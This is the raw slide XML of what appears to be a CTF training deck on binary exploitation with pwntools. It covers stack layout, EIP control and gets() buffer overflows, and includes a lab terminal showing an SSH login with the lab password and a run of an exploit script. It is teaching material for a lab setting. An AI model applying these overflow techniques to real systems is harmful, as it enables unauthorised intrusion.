              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="341337" h="102463">
                  <a:moveTo>
                    <a:pt x="51231" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="290106" y="0"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="303693" y="0"/>
                    <a:pt x="316724" y="5398"/>
                    <a:pt x="326332" y="15005"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="335940" y="24613"/>
                    <a:pt x="341337" y="37644"/>
                    <a:pt x="341337" y="51231"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="341337" y="51231"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="341337" y="79526"/>
                    <a:pt x="318400" y="102463"/>
                    <a:pt x="290106" y="102463"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="51231" y="102463"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="37644" y="102463"/>
                    <a:pt x="24613" y="97065"/>
                    <a:pt x="15005" y="87458"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="5398" y="77850"/>
                    <a:pt x="0" y="64819"/>
                    <a:pt x="0" y="51231"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="0" y="51231"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="0" y="37644"/>
                    <a:pt x="5398" y="24613"/>
                    <a:pt x="15005" y="15005"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="24613" y="5398"/>
                    <a:pt x="37644" y="0"/>
                    <a:pt x="51231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341337" cy="102463"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="25399" tIns="25399" rIns="25399" bIns="25399" rtlCol="0" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPts val="2275"/>
                </a:lnSpc>
              </a:pPr>
              <a:endParaRPr sz="900"/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978512" y="346682"/>
            <a:ext cx="140817" cy="14081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5399" tIns="25399" rIns="25399" bIns="25399" rtlCol="0" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr">
                <a:lnSpc>
                  <a:spcPts val="2275"/>
                </a:lnSpc>
              </a:pPr>
              <a:endParaRPr sz="900"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="AutoShape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="514350" y="4633913"/>
            <a:ext cx="829304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488299" y="1118960"/>
            <a:ext cx="3080600" cy="3096080"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="6161200" h="6192161">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="6161200" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6161200" y="6192160"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="619216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943428" y="3794165"/>
            <a:ext cx="984809" cy="172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55"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="575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01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="575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96145" y="346682"/>
            <a:ext cx="1311584" cy="299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Hidden Investigations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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574232" y="4714061"/>
            <a:ext cx="2001161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13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Hiddeninvestigations.Net</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="13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3802931" y="967784"/>
            <a:ext cx="1575126" cy="103696"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="3150252" h="207392">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="3150252" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3150252" y="207391"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="2073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802931" y="728379"/>
            <a:ext cx="4961506" cy="44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75"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1735" b="1" spc="-90">
                <a:solidFill>
                  <a:srgbClr val="000000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WHO AM I</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1735" b="1" spc="-90">
              <a:solidFill>
                <a:srgbClr val="000000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802931" y="1281550"/>
            <a:ext cx="5058952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 spc="-72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Tanjim M. Tuhin</a:t>
            </a:r>
            <a:endParaRPr sz="900"/>
          </a:p>
          <a:p>
            <a:pPr marL="518160" lvl="1" indent="-259080" algn="l">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" spc="-62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Founder &amp; Lead, Hidden Investigations (est. 2022)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" spc="-62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18160" lvl="1" indent="-259080" algn="l">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" spc="-62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Security Researcher, Yogosha Strike Force</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" spc="-62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2100"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr sz="900"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="TextBox 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3802931" y="2380084"/>
            <a:ext cx="5058952" cy="2563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0"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" spc="-62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Achievements &amp; Awards</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" spc="-62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18160" lvl="1" indent="-259080" algn="l">
              <a:lnSpc>
                <a:spcPts val="2880"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" spc="-62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1st Runner‑up — BlackHat USA CTF 2025</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" spc="-62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18160" lvl="1" indent="-259080" algn="l">
              <a:lnSpc>
                <a:spcPts val="2880"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" spc="-62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2nd Runner‑up — BCS ICT Fest CTF 2025 (Bangladesh Computer Society)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" spc="-62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18160" lvl="1" indent="-259080" algn="l">
              <a:lnSpc>
                <a:spcPts val="2880"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" spc="-62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7th place — Phoenix Summit CTF 2025 (Red Team Village/Threat Sim) </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" spc="-62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2880"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr sz="900"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="TextBox 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3802931" y="1931218"/>
            <a:ext cx="5058952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sz="1200" spc="-62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Core Focus</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" spc="-62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18160" lvl="1" indent="-259080" algn="l">
              <a:lnSpc>
                <a:spcPts val="3790"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" spc="-62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Offensive security, CTFs, Vulnerability research, Red teaming</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" spc="-62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802931" y="3513809"/>
            <a:ext cx="5058952" cy="1311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25"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" spc="-62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Vision</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" spc="-62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18160" lvl="1" indent="-259080" algn="l">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" spc="-62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“Learn together to build a skilled community.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" spc="-62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2400"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr sz="900"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Freeform 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="5575393" y="-1503477"/>
            <a:ext cx="3620915" cy="2471275"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="7241830" h="4942549">
                <a:moveTo>
                  <a:pt x="7241830" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="4942549"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7241830" y="4942549"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="724183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23" name="Picture 22" descr="Whimsical-Baby-Groot-In-Fairytale-Landscape-64526876-1-removebg-previe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329" y="1765459"/>
            <a:ext cx="1803083" cy="180308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" y="127635"/>
            <a:ext cx="9134475" cy="5067300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Rectangles 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8055293" y="4006215"/>
            <a:ext cx="1002983" cy="876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 sz="1350"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text Box 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8055610" y="4127500"/>
            <a:ext cx="881380" cy="755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600"/>
              <a:t>  00</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-GB" sz="3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" y="714375"/>
            <a:ext cx="8001000" cy="4107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Getting on the box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571500" y="1775222"/>
            <a:ext cx="4672013" cy="2182416"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0000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4375" y="1918097"/>
            <a:ext cx="1135856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bash — terminal session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4589859" y="1918097"/>
            <a:ext cx="510778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i386 target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714375" y="2207419"/>
            <a:ext cx="4386263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0FF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$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2C2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ssh buzz@MACHINE_IP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14375" y="2443163"/>
            <a:ext cx="4386263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 Password: buzz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714375" y="2678906"/>
            <a:ext cx="4386263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0FF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buzz@target:~$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2C2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cd IntroToPwntools/IntroToPwntools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714375" y="2914650"/>
            <a:ext cx="4386263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0FF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buzz@target:~/IntroToPwntools$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2C2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ls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714375" y="3150394"/>
            <a:ext cx="4386263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00FF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checksec/ cyclic/ networking/ shellcraft/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714375" y="3386138"/>
            <a:ext cx="4386263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0FF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buzz@target:~/IntroToPwntools$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="7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700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2C2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python exploit.py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5457825" y="1775222"/>
            <a:ext cx="3114675" cy="2182416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00700" y="1932384"/>
            <a:ext cx="2828925" cy="253603"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="51054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Lab Environment Notes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="9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2314575"/>
            <a:ext cx="107156" cy="1071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779294" y="2286000"/>
            <a:ext cx="2650331" cy="4929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Python Version:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="75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Exploits run in python (Python </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="75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2), NOT python3, matching the target VM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="75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environment.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="7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2907506"/>
            <a:ext cx="121444" cy="1071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793581" y="2878931"/>
            <a:ext cx="2636044" cy="4929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Directory Structure:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="75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Four isolated folders </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="75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containing binaries and templates for each </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="75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challenge.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="7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700" y="3500438"/>
            <a:ext cx="107156" cy="1071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79294" y="3471863"/>
            <a:ext cx="2650331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Target Platform:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="75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Linux i386 32-bit binaries </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="75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requiring 32-bit register calls.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="571500" y="4636294"/>
            <a:ext cx="1382316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8329613" y="4579144"/>
            <a:ext cx="242888" cy="2786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05</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="837248" y="453985"/>
            <a:ext cx="958850" cy="1225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Invstigations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="523875" y="42100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1" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="697230" y="464820"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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" y="714375"/>
            <a:ext cx="8001000" cy="4107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 pile of plates: Understanding the Stack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571500" y="1648197"/>
            <a:ext cx="4629150" cy="747861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776785"/>
            <a:ext cx="285750" cy="285750"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C200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862510"/>
            <a:ext cx="114300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1563" y="1776785"/>
            <a:ext cx="4014788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Last-In, First-Out (LIFO)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071563" y="1987525"/>
            <a:ext cx="4014788" cy="27994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Like a stack of cafeteria plates, items are pushed onto the top and popped off in reverse order during function execution.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571500" y="2496071"/>
            <a:ext cx="4629150" cy="747861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85800" y="2624658"/>
            <a:ext cx="285750" cy="285750"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C200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2710383"/>
            <a:ext cx="85725" cy="114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1563" y="2624658"/>
            <a:ext cx="4014788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Downward Memory Growth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1071563" y="2835399"/>
            <a:ext cx="4014788" cy="27994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The stack grows downward in memory from high memory addresses toward lower memory addresses as new variables are allocated.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="571500" y="3343945"/>
            <a:ext cx="4629150" cy="747861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85800" y="3472532"/>
            <a:ext cx="285750" cy="285750"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C200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" y="3558257"/>
            <a:ext cx="128588" cy="1143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71563" y="3472532"/>
            <a:ext cx="4014788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Stack Frame Anatomy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1071563" y="3683273"/>
            <a:ext cx="4014788" cy="27994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Each function call creates a frame containing local variables, the saved base pointer (EBP), and the return address (EIP).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5486400" y="1525191"/>
            <a:ext cx="3086100" cy="2718197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0433" y="1714500"/>
            <a:ext cx="114300" cy="1143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34733" y="1693069"/>
            <a:ext cx="1303734" cy="1607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Memory Stack Layout</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5629275" y="2010966"/>
            <a:ext cx="2800350" cy="32146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5629275" y="2010966"/>
            <a:ext cx="2800350" cy="321469"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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High Address: Function Arguments</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5629275" y="2375297"/>
            <a:ext cx="2800350" cy="32146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5629275" y="2375297"/>
            <a:ext cx="2800350" cy="321469"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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Local Variables &amp; Buffers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5629275" y="2739628"/>
            <a:ext cx="2800350" cy="32146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629275" y="2739628"/>
            <a:ext cx="2800350" cy="321469"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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Saved Frame Pointer (EBP)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5629275" y="3103959"/>
            <a:ext cx="2800350" cy="321469"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C2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5629275" y="3103959"/>
            <a:ext cx="2800350" cy="321469"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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Saved Return Address (EIP)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5629275" y="3468291"/>
            <a:ext cx="2800350" cy="32146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5629275" y="3468291"/>
            <a:ext cx="2800350" cy="321469"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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Low Address: Next Instructions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="7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3644" y="3886200"/>
            <a:ext cx="57150" cy="92869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350794" y="3871913"/>
            <a:ext cx="1414463" cy="1285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Grows Downward in Memory</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="571500" y="4636294"/>
            <a:ext cx="1382316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37" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8336756" y="4579144"/>
            <a:ext cx="235744" cy="2786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06</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="837248" y="453985"/>
            <a:ext cx="958850" cy="1225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Invstigations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="523875" y="42100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1" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="697230" y="464820"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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" y="714375"/>
            <a:ext cx="8001000" cy="4107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EIP: the program's next destination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571500" y="1572797"/>
            <a:ext cx="3893344" cy="1775222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778180"/>
            <a:ext cx="135731" cy="13573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0119" y="1744247"/>
            <a:ext cx="825103" cy="20359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What is EIP?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742950" y="2119294"/>
            <a:ext cx="3550444" cy="10287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EIP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="80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(Extended Instruction Pointer) is a 32-bit CPU register </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="80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that holds the memory address of the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="80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next instruction</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="80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to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="80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execute.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="80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
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="80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On 64-bit systems, this register is called </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="80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RIP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="80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. Control EIP = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="80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control where the program goes next.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679156" y="1572797"/>
            <a:ext cx="3893344" cy="1775222"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FAFAFA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606" y="1787723"/>
            <a:ext cx="153591" cy="13573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75634" y="1753791"/>
            <a:ext cx="1171575" cy="20359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GPS Analogy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4850606" y="2128838"/>
            <a:ext cx="3550444" cy="10287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Imagine driving a car with a GPS navigation system.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="80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
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="80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The CPU blindly follows EIP just like a driver follows GPS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="80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instructions. If you rewrite the destination address in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="80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memory, the program will happily drive off to wherever you </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="80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point it.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571500" y="3679031"/>
            <a:ext cx="8001000" cy="471488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C2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71500" y="3679031"/>
            <a:ext cx="8001000" cy="471488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="204089" tIns="136017" rIns="204089" bIns="136017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“Overwrite EIP, and you choose the program's future.”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71500" y="4636182"/>
            <a:ext cx="1382316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8358188" y="4579032"/>
            <a:ext cx="214313" cy="2786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07</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="837248" y="453985"/>
            <a:ext cx="958850" cy="1225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Invstigations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="523875" y="42100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1" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="697230" y="464820"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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" y="714375"/>
            <a:ext cx="8001000" cy="4107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 box that never checks its size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571500" y="1962745"/>
            <a:ext cx="3893344" cy="180736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153841"/>
            <a:ext cx="128588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119908"/>
            <a:ext cx="1446609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Unbounded Input Risk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14375" y="2491383"/>
            <a:ext cx="1718072" cy="1535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Standard C input functions like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2432447" y="2491383"/>
            <a:ext cx="353616" cy="1535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gets()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2786063" y="2491383"/>
            <a:ext cx="1146572" cy="1535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and unchecked read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714375" y="2652117"/>
            <a:ext cx="3282553" cy="1535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operations do not verify whether input length exceeds buffer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714375" y="2812852"/>
            <a:ext cx="507206" cy="1535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capacity.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714375" y="3134320"/>
            <a:ext cx="3532584" cy="1535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When an input string is longer than the allocated memory buffer,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714375" y="3295055"/>
            <a:ext cx="3203972" cy="1535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excess bytes spill over adjacent stack memory, corrupting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714375" y="3295055"/>
            <a:ext cx="3582591" cy="3143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critical stored registers and return pointers.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4679156" y="1977033"/>
            <a:ext cx="3893344" cy="1778794"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0000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822031" y="2119908"/>
            <a:ext cx="1275159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2C2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vulnerable.c (intro2pwn3)</a:t>
            </a:r>
